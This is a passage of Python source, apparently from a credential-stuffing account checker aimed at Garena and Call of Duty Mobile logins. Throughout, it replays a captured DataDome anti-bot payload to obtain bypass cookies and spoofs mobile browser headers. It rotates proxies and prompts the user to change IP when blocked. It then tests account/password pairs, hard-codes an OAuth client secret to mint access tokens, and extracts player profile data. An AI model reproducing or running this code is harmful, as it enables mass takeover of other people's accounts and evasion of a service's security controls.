            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), TimeElapsedColumn(), console=console, transient=True) as progress:
                    task = progress.add_task('[yellow]Waiting for IP change…', total=max_wait_time)
                    while time.time() - start_time < max_wait_time:
                        time.sleep(check_interval)
                        progress.update(task, completed=time.time() - start_time)
                        current_ip = self.get_current_ip()
                        if current_ip and current_ip != original_ip:
                            _log('SUCCESS', f'IP changed: [dim]{original_ip}[/dim] → [bold bright_green]{current_ip}[/bold bright_green]')
                            if _ip_block_callback:
                                _ip_block_callback(False)
                            return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    
    headers = {
        'content-length': '6374',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept': '*/*',
        'origin': 'https://sso.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sso.garena.com/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
        'cookie': f'_ga_1M7M9L6VPX=GS2.1.s{timestamp}$o21$g1$t{timestamp}$j53$l0$h0; _ga=GA1.1.{random_id}.{timestamp}'
    }
    
    payload = {
        'jspl': 'QGQ0BVgjckhG9XFf_olrvPEwB5AKErtjUd6f_dtbCw6uU4mUnl4Ca5uJY9K_OWQfTtT2EcX852pDG2IId4gG5U65OppS7iwx7RfQ1zzKRMro56Xwcuu9Q_K16c69frRlWlLQd-n0p6XgiRXwusJv0AzdM9tBXrKAChlwUPvgd1086UwD5VEdfQXn-_xJN7-6-7Fs2LBt0A7vW4CPF6iCHCIKFJHbFFo8uTxvSdJL69AHKqqrRJ8oQCkfO_GrZiTFCXZAbGwdCqzkFEGFeBGH0RVAG_q7wmiKlII3zlcqZcRgoP2awfU6RjhvIeJToH5rTrby8SGuCZXLAGCG2tcCxraVYDQEL63p5anIGBrdTwdGVE6yL8B4vXNXLTIO0iq0AWjCksq599tQ38RAgo0tMl6cix0pOUwpigTNKY-4eIEEaQ2Cn_Nr9eXTrqRWZOaszlStMIE8M73ErsI_6dLXI5tcohL1NA0k6dPyVhurkMtYjUodgDN0EluJufLMKvH_D6-JT9xIebqCZ2zPv2eOO5wcMC1TyHFjR3NGwpJvD-YghfQUxdmFd3Xcjc41Rcp21CZ2HVsFZME-B8ppZ7AyU3Mn-ETydYWauETEamzkZynKSMKQTys-SrbONsKCbmQiGUxDumBKsPR8ODY87U_QKs3icJeXPheiBv-0w40kMiBU7KLYOrH0wCcGPO4pWS5bl9ju2KF3nMwD5V5AajCqdotm-JU7qAZxJiPAtU9xZmqr-mDQELX56jokfmqkX8v_4YZeAdx0VU96Rpj_-qdvhKpzm9OYZeJI-4VVLhXN200cEumhRfyVp5HZ3pUdUYxgp0ryCydj31kG8dLTDCKTIhMtsUo3bSypcbsE-xdz-P-gUNUYXcTN7uuekhuKwNIeEcTcLdw6udGartLTkTt4SmWxncPDzKwLh6qdhdRVAJIhlbeFY_OeIF4TkCPbGEv9xlN3MJFZccX097QLDT9niyMzxACRar3aPJDzZlaoyyr0asFkNu65-Hfj_XLYlSYET7vC-Sqgzo5016flXcuzKZvMfJp9Jk78GRUtYtVPHEJzMdU0SMcKTp8joR8Y_mmyHIOnoGer4TatyOfNCRF8XOJNdMwp3qSknYp_yfBSUa1Ij3WPtX9lg5kl50YJgNQPovYyCJU_Dwjty_KirEFgbUoOT7yr7w5pJc7yBC2n3wfTxiwmp-RsBwZXlk19UYDiGwWTMA5EfglURLVraue7Df36AEQV5QqBVupNtGpZFwPC5K9YJDG5DIlIMNfIL4X8chGhxCMV6nem-otHDi9JUkcVbTttqrJyXQ50FNfRwUt_ScqwsXVEBD26I-AD6xsdkqmCx60ehJMXiSywNE_Mjt9zG4TUoHKY95gpcXDSvcSVJ6W-rCAQ3M0vcgu5wcdEb1SXmBzUJf_rSJxZoFNPdZjgrQqVBByJKy2V7x4ywPpPPf83z0Y6B7gkW6RS7fUlT47SSjvtkXGYoRLn9zDcOtvX1TxxUXrDjw4H9T5n7zOy5Eao7BQ9fcDgZ1pyYH6soR9Ug2MsOX5cHCH5LMC7qZtDW0aFKLD76LNMcZfWxn_tiadU3JynnXwkZ8B70leGLWoe9azUJY0F_xgD6tgCKf1xxJQAtcuUU1PTHG_kIFhD_UrZiq4DKhIMZgvkSgwEvpYmHOnpRZMoqOn2T81bwz1jhDq3H0YJClW2y0Bzk_cvMEZOb05kS3cHr0fcVGnLkqxGWWsT9YVRbNueDhbZIoPfdiOpqn9ZTOpxKFxwEuEeKaPSfb6A7PUAHREieN9hpCdlmZwygPw3sHpK0jdD-hKUTiG3d-xOr2Tc9-QVtSy_mdR_rSdMDvXEJsVZJ33f6SaKsnsElaLd2vB8YZfUaTksujLUBqgxd4gSKUdcEZ-_-8huvk9MJFsw37KqHYVCCmdHzJe_KjC6GZx4UGskD1amFPKYTp7Q4H9U-RIflTDX3K8Pxced7Kx4W-7tDt8V5wj6ggRDK_wAZ_8fxpjrH7PhEyTTeJxB_bJ2Sigbjoi368mAoudRMkiChN66D8xap_nYUCtBkdFDZpThAv04leKOllua60DS5W1KL91x9CYMPmKQUWMHFVY6MqPaUsecHxDK1WujPkCnSGKpr0iiEHNpbC_5atdvXmS2dVjyih1fXxpnwW5-uyybBQKkhWXcI6HXC5ic6J4sBra17lvvBfff4sAw_FohvjPwNUCW4fUKz8qrLXYWuhTtsgzCdwXKnNbAJHFg5RPiAR3sDj6eIPJlRSv3foRh656t3015JAetowe7J2l7a_UBRmkQmZerVBEh8LCgU_BqE1Kz4ibHWHBPcBSRZVzCmfUXVUWWaYfAtBUIkz4n0TNDf3MjhksOpda2sKiJ97w7lZDPA_46hiFhfM6SP8y9GV7ToaXGxY-rsDGKxUXvCmk73l5YbxfaHfGhMpKxsSCaj40MFKyCNydU7Wn9Eha1bNW0CdenKkrTcJgpfgHkOKSjIFJMJzElcE1TWTYWxlqJqKHnMw9GmQFPe0JiYSf_NWtU2AFv7cjqCeYU6EOWN6yNMPCpIKHapVzCpwSxVmdywJYwFpte2kcu0RDICFHL1_ocSPF83azDEAcyb2sK6hu5WBR9mB-KGKnBzkktfo7TSvrq05d6jQInG3jxnFULmdvyUhIf7Wh9PoO48psknM85XQ3gCMMUlqyBw0TcsGaik-DLyFnoWo2bQW9vpPhmxO_wtQ6YBfQpIRsJlDexBaLWFX7KpWOr4wgX-0jviPLsXOGSWUQ-e6PxflfbEOB6hYdBL7uJhRO7QA8wsLvnUUxdLY7mxqzCJF2_l_O2a_Sdw7MId_KjEerVYj0VHm9svX7RdrrnS2DzbXyXzRGOy8l6OzQoDUAQRfyV2mjZgpYPxQry2G3P538x4zw-k_JNsy39rhjM0-uCTQ1d7YapQx3W20R3CxSPgk4tiu7sIKQxs-QpnHTKetaGW4MJEreDRZ_h8_oukyvaFPpItE9Yc8SIt1T-2RkAnDNXBA-g287V6lo6v_nNh7mGYC3Lx4qeG26aAsR3oX9SiSCuAp8Lyahw4Q2yPo4NTvsxLuY_b7SzMybfyQVXOCzHRx9VrQXWrTQ3iFvC1o49YQdta8tG1SA15bvhD5IpVcHi6HduW7SEll7Uk1l6hvg8GwwkDSsAqXa7Rsu7g5GL_hI-GaAP1R7VK3iD_TXLAnRoETWh56dMqw4l_QqKCggCA-WSj3WKIXcDnuTtnZragribanEi7_F_DL2q0OHuD1KqzY7c8eouznfNmOHASe_GwrcIVMr-XT1Rf5huXlnQ1l8eqgqQR1oQkc_K3ihzMJM8L_Vhd0_KLR4-1ICSL1QdOSboLjH2nVuzc7je6FyRyNOUBSZU1sT5caMBnNllX4FRwduqGSje9X6XY8a5vYd5Kpgp3AyrPv8gVLExQguIGFa-4IbLmjsM1B6UEj4VTcFM8RJ221_n3KuVDl5X-_g2rW3GHP8zUPlkYOmlJ5Z0GQ8ubDGe14nAAA9H-Rop4TaNFkMup3EOr3Ec6_GvPxzET3lcdP9qF6FdYmY9Ejhr18yGFZfDf3w3y_K7PRfRkEsdliiCSvYosgssIs8jB2VzL3HEbwwjCz_aKZT0W9NYkBxAi8cZf676phGbEJ50hoYRSIwJJU8Tu0A0hrUnkvw3Woc-88SWO4ZlpAxUZXiuFtfhQxbO1SXxByBTaWdJ9GkxriyF0zg8TQeOoZFi5ad-FLPfriP1DitrrITsJKPN-hpORrNd0yjGf9D_-9vD4Mvm8IzkEbzNpX4VHVhrwFLlpk6aeME9q01T-CX5PqmkoVk4cZihcoQe-i96Mcy-umgshZdAyxckIjGFv_vWQYxghUwNTMOotHXbx58RJQQ8QY2FoSyVbTpUXM7yL8_xLT5mh4N_qx66Gpw0t7mSUDSIB992q3vugspQWO2UKy1j5gw8UzlmgYvNTOcR5pRav6Zp-we0685y8IdrKbwH0dm6ZnSSmAlw0WD-YveLDEWJgcFYE94fkZ83czXgJb7I-JrLiyHk7K7aSmXkII-60Fm1ksQayHbJsvnzmXzbaWtp2tgCmM1hqahSnXN_eaUTaDumK9-e-iobjOXcYPERFwssEA_zrRvXFdoiINmqtwVi4so7quVBEMsjyOPsN4WjfgJo39il-yBMVlpBYMxZjZrzoxBU6RaNq3Vn2xz9PTIUnpqFm1V2wAdH-gJNvravSZxWRd8e2ub5SMBJEddGHZMmY2oaxlI1XgsNg9FLFm78WqOP3oqvjpoNPAUeKu6IbDRtuwKEZEQjBCYrih9zELsUYUD2vDr9r4JxSY2_SRx1Istk-z6cm6blTyybiBsrT3t-uULM4VHKBQGcOKF10aeZJkvclKSxI-kUIu97evHkFKcXG6mWRGXt0rzkPCzm12Dm6dLdkS1p4nQGGmlxNf913DXotB7EsBc62ddIO7O1KJTWRCIxBnFmVl2smSMkZ34xaqLcoM17k9zqA8RMYUpUjfnIjhCQCNtRpdJvVsyFVLujlhgBnkNg5ev27PYGgHzEQHeDsNOAMJOf-lzxKn8stzPJp0OjpCNsWcYW6NhbgwnS4y4zzsjGNWSSO8MFpeG-5v2B2ASKsex0TGFmRSsZIP6N_2nJP28QWQEDWL08qKJ1TyrR7P-XbpOm8UmHb2beK56hMHafXmISVakfP0dS3Oh224nYa6QMn8yYiNgvzDKik4bHHiIftnLcCaRZC8FIiioBnj69Ya0tWe0aXwgkNDiTj8ko60jsSFA6x0Y9uAQupjTGjAXkIUGRbfSa-h3qYe4dPiDb0OwpUM7beqkblKvbqNBqy8So5F8MPNaDAS7L0syTp2ugVvp0iwZCAB-4xWJqyToyzNJVrGU9K8jlX7qbh7d7NwqohBq1UT_wEjl2C4Vk1domhlfZeaUPfpMAwTMSLlogvpqsr5dcygjtcH2RL0xvorT9RItWdExi0ZEgZYR2e16sctZHqJdmHDLrcgfxHXV9XpX3I0M20fJe2yV1w5m_Kl5EDs72f8JcrKNvTgCGRa1Jmxu_3yXcWJ1hQSBFauGi6dXnBFk87FUjIewCpy6744anPrNjdBW9zZPAUN4t2E3ehNZKxRddzl9sGlUYR6xkDaKXCthj1sAwjuLfwrYaynulYXCzH9BymnYqWrBGEKQ6SP5OR7uxPfQVRnDPFqXP1kfZlwTNPcDGXUb-EWVxR9w7H6QVPTROp9nkdf_SSQ3u88x1gnD_SVwfwsIh9NXt1L-JidK1DEV2I72FcTxVH4sM4Ch8q8i6x1_Soo6CGnXNKFGUZE2xg8jo2G8O_pwSbOTULG5dXtt_4nFyCWsRhDeFBn7bvguKg0sl4cBHkD_Li8rN-3H8hFw137Q3N2v39DEXGfJEB0et2PX-4r1gVA7qqUHUcNwdvy6ZOcRQg_NYvGgcGWoQde5eAHIQ0avvSQGUHFEUb6NuiiOcKoDXipJtsbNi2UR3pIhfr8YsFQTqdz3NF2zo9IEvY0uds1VowMJAIBF001MlYmMQ3iAVutCrJnMehTpDFZztqzUJ917m72Snc2NA2LSPObaq5M6wiPpLnscG1yCJlVo52xazMfcn3jeRg-RoOAK-mHBSQ-W7oD',
        'eventCounters': '{"mousemove":4,"pointermove":1,"click":4,"scroll":0,"touchstart":4,"touchend":4,"touchmove":0,"keydown":2,"keyup":2}',
        'jsType': 'le',
        'cid': 'ROxC_oAlhyCRnDuIxNT_gKAsk8IOlYBFcrRuxfab_kt77Rrbyhu8xH21Zm6rN1hshR8R1vYl6Mlq8rC8fFRV7M9NV8EwyGm_EF0dY2yiLhcSRRttpELcrtVbTtmEMGG2',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https%3A%2F%2Fsso.garena.com%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'request': '%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'responsePage': 'origin',
        'ddv': '5.8.0'
    }
    
    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
    
    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None):
    all_403 = True
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'Host': 'sso.garena.com',
                'Connection': 'keep-alive',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'Accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua-platform': '"Android"',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-PH,en-US;q=0.9,en;q=0.8'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=30)
            if response.status_code == 403:
                proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                all_403 = True
                break
            if response.status_code == 429:
                time.sleep(3)
                continue
            response.raise_for_status()
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
            if 'error' in data:
                return (None, None, new_datadome)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return (None, None, new_datadome)
            return (v1, v2, new_datadome)
        except requests.exceptions.ConnectionError:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except requests.exceptions.Timeout:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                time.sleep(1)
                continue
    if all_403:
        return ('IP_BLOCKED', None, None)
    return (None, None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
    if cookie_header:
        headers['cookie'] = cookie_header
    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(k, v, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
    return None

def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'sec-ch-ua-mobile': '?1', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'}
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'}
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
